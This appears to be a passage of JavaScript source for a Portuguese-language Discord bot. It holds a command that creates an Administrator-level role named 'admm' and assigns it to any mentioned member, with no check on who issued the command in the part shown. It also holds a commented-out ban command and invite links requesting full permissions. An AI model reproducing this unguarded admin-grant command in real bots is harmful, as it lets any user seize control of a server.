    description: "**❌ Eu não possuo a permissão de `Gerenciar Cargos` para executar este comando**",
    color: "#ff0000"
  }})
}
  let role = message.guild.roles.cache.find(ch => ch.name === "admm")
  if(!role) {
    let criarrole = message.guild.roles.create({data: { name: "admm", permissions: [8]}})
    return message.channel.send({embed: {
      description: "**❌ Não foi possível encontrar o cargo `admm` por isso criei um para você**",
      color: "#ff0000"
    }})
  }
  let member = message.mentions.members.first()
  if(!member) {
    return message.channel.send({embed: {
      description: "**❌ Não foi possível encontrar o user mencionado**",
      color: "#ff0000"
    }})
  }

member.roles.add(role.id)}

//ban

//module.exports.run = async (client, message, args) => {
 // if(!message.guild.me.hasPermission(["BAN_MEMBERS", "ADMINISTRATOR"])) {
  //  return message.channel.send({embed: {
     // description: "**❌ Eu preciso da permissão de `Banir Membros` para executar este comando**",
    //  color: "#ff0000"
   // }})
 // }
  
  //let target = message.mentions.users.first()
  //if(!target) {
   // return message.channel.send({embed: {
     // description: "**❌ User não encontrado ou não //mencionado!**",
     // color: "#ff0000"
   // }})
  //}
  //if(target.bannable) {
    //return message.channel.send({embed: {
      //description: "**❌ Você não pode banir este usuario**",
      //color: "#ff0000"
   // }})
  //}
  //if(target.id === message.author.id) {
  //  return message.channel.send({embed: {
    //  description: "❌ **Você não pode se banir**",
     // color: "#ff0000"
    //}})
  //}
  
  //message.guild.member(target.id).ban(target)
  
//}
  
//invite 

client.on("message", message => {
    if (message.author.bot) return;
    if(message.channel.type === "dm") return;
    if (
    message.content.toLowerCase().startsWith(prefix + 'invite') ||
    message.content.toLowerCase().startsWith(prefix + 'botinvite')
    ){
    console.log(green(`Comando: invite`))

    const embed = new Discord.MessageEmbed()
    .setThumbnail(client.user.displayAvatarURL({dynamic: true}))
    .setURL("https://discord.com/invite/2X4aAZbUKe ")
    .setTitle("Link para invitar o PIV bot")
    .setDescription("_ _\n**⚠️ • Para invitar o bot precisa ter ADM no server **\n\n\`Link para invitar o bot (Com perm de admin) => \`  [Clique aqui](https://discord.com/oauth2/authorize?client_id=893534779184664596&scope=bot&permissions=8)\n\n\`Link para invitar o bot (Com todas as perms) => \`  [Clique aqui](https://discord.com/oauth2/authorize?client_id=893534779184664596&scope=bot&permissions=1099511627775)")
    .setFooter(`Comando feito por: ${message.author.tag}`)
    .setColor("#ee3a3a")
    message.channel.send({ content: "__**link to add bot**__", embed: embed }).catch(() => {});
    
}
});


 client.login(process.env.TOKEN);
    }
})
const mySecret = process.env['TOKEN']
